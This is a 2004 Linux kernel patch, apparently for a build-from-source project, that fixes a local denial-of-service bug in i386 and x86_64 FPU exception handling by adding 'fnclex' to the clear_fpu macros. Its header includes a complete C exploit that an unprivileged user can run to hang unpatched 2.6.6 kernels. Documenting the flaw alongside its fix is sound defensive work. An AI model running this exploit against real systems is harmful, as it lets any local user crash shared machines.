@@ -1,0 +1,64 @@
+Submitted By: Alexander E. Patrakov
+Date: 2004-06-14
+Origin: linux BK repository
+Initial Package Version: 2.6.6
+Upstream Status: Fixed
+Description: Fixes an exploitable DoS vulnerability in FPU exception handling
+in 1686 architecture. A non-root user could completely hang the system by
+causing a FPU exception in a signal handler.
+
+Exploit for unpatched kernels:
+
+============================================
+#include <sys/time.h>
+#include <signal.h>
+#include <unistd.h>
+
+static void Handler(int ignore)
+{
+ char fpubuf[108];
+ __asm__ __volatile__ ("fsave %0\n" : : "m"(fpubuf));
+ write(2, "*", 1);
+ __asm__ __volatile__ ("frstor %0\n" : : "m"(fpubuf));
+}
+
+int main(int argc, char *argv[])
+{
+ struct itimerval spec;
+ signal(SIGALRM, Handler);
+ spec.it_interval.tv_sec=0;
+ spec.it_interval.tv_usec=100;
+ spec.it_value.tv_sec=0;
+ spec.it_value.tv_usec=100;
+ setitimer(ITIMER_REAL, &spec, NULL);
+ while(1)
+  write(1, ".", 1);
+
+ return 0;
+}
+============================================
+
+diff -Nru a/include/asm-i386/i387.h b/include/asm-i386/i387.h
+--- a/include/asm-i386/i387.h	2004-05-06 12:26:10 -07:00
++++ b/include/asm-i386/i387.h	2004-06-12 19:12:23 -07:00
+@@ -51,7 +51,7 @@
+ #define __clear_fpu( tsk )					\
+ do {								\
+ 	if ((tsk)->thread_info->status & TS_USEDFPU) {		\
+-		asm volatile("fwait");				\
++		asm volatile("fnclex ; fwait");				\
+ 		(tsk)->thread_info->status &= ~TS_USEDFPU;	\
+ 		stts();						\
+ 	}							\
+diff -Nru a/include/asm-x86_64/i387.h b/include/asm-x86_64/i387.h
+--- a/include/asm-x86_64/i387.h	2004-06-13 07:10:39 -07:00
++++ b/include/asm-x86_64/i387.h	2004-06-13 07:10:39 -07:00
+@@ -48,7 +48,7 @@
+ 
+ #define clear_fpu(tsk) do { \
+ 	if ((tsk)->thread_info->status & TS_USEDFPU) {		\
+-		asm volatile("fwait");				\
++		asm volatile("fnclex ; fwait");			\
+ 		(tsk)->thread_info->status &= ~TS_USEDFPU;	\
+ 		stts();						\
+ 	}							\
